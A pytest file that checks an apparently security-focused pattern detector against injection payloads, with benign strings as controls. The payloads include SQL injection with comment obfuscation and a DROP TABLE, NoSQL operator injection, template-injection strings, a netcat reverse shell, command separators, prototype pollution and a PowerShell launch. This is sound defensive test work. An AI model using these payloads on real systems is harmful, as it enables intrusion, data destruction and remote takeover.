import pytest


async def _detected(manager, payload: str) -> bool:
    result = await manager.detect(payload, "127.0.0.1", context="unknown")
    return result["is_threat"]


@pytest.mark.asyncio
async def test_comment_between_keywords_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection, "SELECT/**/FROM/**/users"
    )


@pytest.mark.asyncio
async def test_comment_inside_keyword_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection, "SEL/**/ECT password FROM users"
    )


@pytest.mark.asyncio
async def test_mysql_version_comment_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection, "1' /*!50000OR*/ '1'='1"
    )


@pytest.mark.asyncio
async def test_quote_flanked_comment_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, "1'/**/OR/**/'1'='1")


@pytest.mark.asyncio
async def test_benign_css_comment_not_flagged(sus_patterns_manager_with_detection):
    assert not await _detected(
        sus_patterns_manager_with_detection,
        "color: red; /* main theme */ font-size: 14px",
    )


@pytest.mark.asyncio
async def test_stacked_ddl_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection, "'; DROP TABLE users;--"
    )


@pytest.mark.asyncio
async def test_order_by_enumeration_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, "1' ORDER BY 1--")


@pytest.mark.asyncio
async def test_benign_order_prose_not_flagged(sus_patterns_manager_with_detection):
    assert not await _detected(
        sus_patterns_manager_with_detection,
        "please order by phone or email when you can",
    )


@pytest.mark.asyncio
async def test_quoted_nosql_gt_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, '{"$gt":""}')


@pytest.mark.asyncio
async def test_quoted_nosql_ne_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, '{"$ne":null}')


@pytest.mark.asyncio
async def test_benign_json_dollar_value_not_flagged(
    sus_patterns_manager_with_detection,
):
    assert not await _detected(
        sus_patterns_manager_with_detection, '{"price":"$25","name":"coffee"}'
    )


@pytest.mark.asyncio
async def test_erb_ssti_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, "<%= 7*7 %>")


@pytest.mark.asyncio
async def test_ognl_ssti_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection,
        "${@java.lang.Runtime@getRuntime().exec('id')}",
    )


@pytest.mark.asyncio
async def test_dollar_brace_math_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, "${7*7}")


@pytest.mark.asyncio
async def test_benign_shell_var_not_flagged(sus_patterns_manager_with_detection):
    assert not await _detected(
        sus_patterns_manager_with_detection, "export PATH=${HOME}/bin"
    )


@pytest.mark.asyncio
async def test_netcat_pipe_revshell_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection, "|(nc -e /bin/sh 10.0.0.1 4444)"
    )


@pytest.mark.asyncio
async def test_bare_separator_command_detected(sus_patterns_manager_with_detection):
    assert await _detected(sus_patterns_manager_with_detection, "test;ls")


@pytest.mark.asyncio
async def test_fullwidth_semicolon_command_detected(
    sus_patterns_manager_with_detection,
):
    assert await _detected(sus_patterns_manager_with_detection, "test；ls")


@pytest.mark.asyncio
async def test_benign_semicolon_text_not_flagged(sus_patterns_manager_with_detection):
    assert not await _detected(
        sus_patterns_manager_with_detection, "first do this; then enjoy your day"
    )


@pytest.mark.asyncio
async def test_prototype_pollution_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection, '{"__proto__":{"isAdmin":true}}'
    )


@pytest.mark.asyncio
async def test_dotnet_process_start_detected(sus_patterns_manager_with_detection):
    assert await _detected(
        sus_patterns_manager_with_detection,
        'System.Diagnostics.Process.Start("powershell","-c whoami")',
    )
